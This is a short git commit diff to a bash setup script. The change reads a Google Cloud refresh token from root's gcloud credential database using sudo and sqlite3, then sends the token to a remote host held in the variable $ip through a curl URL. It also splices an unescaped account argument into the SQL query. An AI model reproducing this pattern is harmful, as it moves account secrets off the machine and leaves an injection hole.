79a04e6b0505fd706454f9760b719fe8dfbf3827
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-23 15:32:02 -0300

    Update first_run.sh

--- first_run.sh
+++ first_run.sh
@@ -1,12 +1,17 @@
 #!/bin/bash
 
+source http
+
+account=$1
+
 file='refresh_token'
 
-$account = $_GET['account'];
-
-sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$1'" > $file
+sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$account'" > $file
 
 refresh_token=$(jq '.refresh_token' $file)
 refresh_token=${refresh_token//'"'/}
+
+url=$ip'/first_run.php?account='$account'&refresh='$refresh_token
+curl $url
 
 echo $refresh_token
